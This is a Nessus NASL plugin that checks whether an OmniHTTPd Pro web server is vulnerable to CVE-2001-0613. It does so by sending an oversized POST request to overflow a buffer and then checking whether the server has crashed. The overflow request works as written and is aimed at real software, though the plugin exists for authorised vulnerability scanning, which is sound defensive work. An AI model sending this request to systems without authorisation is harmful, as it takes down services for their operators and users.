#
#  This script was written by David Maciejak <david dot maciejak at kyxar dot fr>
#
#  Ref: SNS Research  - <vuln-dev@greyhack com>
# 
#  This script is released under the GNU GPLv2
#

# Changes by Tenable:
# - Revised plugin title (3/27/2009)
# - Changed family (6/25/2009)


include("compat.inc");

if(description)
{
 script_id(15553);
 script_version("$Revision: 1.4 $");
 script_cve_id("CVE-2001-0613");
 script_bugtraq_id(2730);
 script_xref(name:"OSVDB", value:"1829");
 
 script_name(english:"OmniHTTPd Pro Long POST Request DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is vulnerable to a denial of service." );
 script_set_attribute(attribute:"description", value:
"The remote host is running OmniHTTPd Pro HTTP Server.

The remote version of this software seems to be vulnerable to a buffer 
overflow when handling specially long POST request. This may allow an
attacker to crash the remote service, thus preventing it from answering 
legitimate client requests." );
 script_set_attribute(attribute:"solution", value:
"None at this time" );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P" );

script_end_attributes();

 
 script_summary(english:"Test OmniHTTPd pro long POST DoS");
 script_category(ACT_DENIAL);
 script_copyright(english:"This script is Copyright (C) 2004-2009 David Maciejak");
 script_family(english:"Web Servers");
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www",80);
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);
if (! get_port_state(port)) exit(0);
if ( http_is_dead(port:port) ) exit(0);


banner = get_http_banner(port:port);
if ( ! banner ) exit(0);
if ( ! egrep(pattern:"^Server: OmniHTTPd", string:banner ) ) exit(0);

soc = http_open_socket(port);
if (! soc) exit(0);

len = 4200;	# 4111 should be enough
req = string("POST ", "/", " HTTP/1.0\r\nContent-Length: ", len,
	"\r\n\r\n", crap(len), "\r\n");
send(socket:soc, data:req);
http_close_socket(soc);

sleep(1);

if(http_is_dead(port: port))
{
 security_warning(port);
 exit(0);
} 
